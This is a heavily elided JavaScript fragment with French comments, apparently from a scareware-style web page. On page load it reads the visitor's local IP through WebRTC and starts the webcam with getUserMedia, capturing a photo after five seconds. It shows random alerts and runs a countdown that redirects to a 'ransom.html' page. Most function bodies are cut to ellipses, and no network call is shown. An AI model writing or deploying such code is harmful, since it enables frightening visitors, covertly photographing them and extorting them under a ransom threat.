document.addEventListener('DOMContentLoaded', () => {
    ...
    // WebRTC pour obtenir l'IP locale
    ...
    // Ajouter des messages à la console
    ...
    function countdown() {
        ...
        const timer = setInterval(() => {
            if (timeLeft <= 0) {
                ...
                setTimeout(() => {
                    window.location.href = 'ransom.html'; // Rediriger vers la page de rançon
                }, 3000);
            } else {
    ...
    function startWebcam() {
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                ...
                setTimeout(capturePhoto, 5000); // Capture photo après 5 secondes
            })
            .catch(error => {
    ...
    getLocalIP(ip => {
        ...
        }, Math.random() * 20000 + 10000); // Alerte aléatoire entre 10-30 secondes
    });
});